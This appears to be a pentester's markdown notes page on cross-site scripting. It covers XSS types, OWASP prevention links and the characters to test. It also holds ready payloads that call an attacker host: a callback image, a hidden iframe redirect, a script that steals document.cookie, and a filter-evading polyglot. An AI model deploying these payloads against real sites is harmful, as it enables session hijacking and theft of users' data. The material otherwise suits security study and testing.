[Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting) either client-side or server-side
Unsanitized data can allow attacker to inject client side scripts into webpages and execute malicious code.

XSS Type | Description | Potential Targets
--- | ---
Stored or Persistent(Can be blind) XSS | Payload is stored in database or cached by server | Everyone
Reflected XSS  | Payload included into a page contents | Request-er or link follower only
DOM-Based XSS  | Similar to the above but only occuur in a page's Document Object Model (DOM) | Browser parses the page's content
Self-XSS | Social Engineering a victim to the execute malicious JS | Socially Engineered
Mutated XSS | Injection that rewritten and modified by browser while parsing the markup. | Type related. 

## Prevention

A defense in depth approach should be applied as data should be sanitized in every location to where the data is passed.

[XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
[DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)


## Identifying XSS

If the application does not filtering these characters by removing or encoding them, it may be vulnerable to XSS.
```javascript
< > ' " { } ;
```


## Useful Tricks

Listener at the ready you can check if you get a connection back:
```html
<img src=http://$attacker-ip:port />
```
[Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)

Content injection, server a file with an iframe of no size sending victims browser to a client-side attack or to script that gathers information. 
```html
<iframe> src=http://$attacker-ip:port/file height=”0” width=”0”></iframe>
```

Cookie Stealing
```html
<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

Bypass payload size restrictions by [linking to an external Javascript file](https://www.youtube.com/watch?v=Uo3cL4nrGOk).

With Iframes see either `src` idicative of a URL or content with `data` or `srcdoc` in [Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 


## XSS Polyglots
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

## SKing7's XSS Filter Evasion Cheat Sheet

This cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate. 
[Sking7](https://sking7.github.io/articles/218647712.html)




## References
[Owasp](https://owasp.org/www-community/attacks/xss/)
[XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
[DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[XSS Wiki](https://en.wikipedia.org/wiki/Cross-site_scripting)
[sking7](https://sking7.github.io/articles/218647712.html)
[Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)
[Owasp Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
[Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 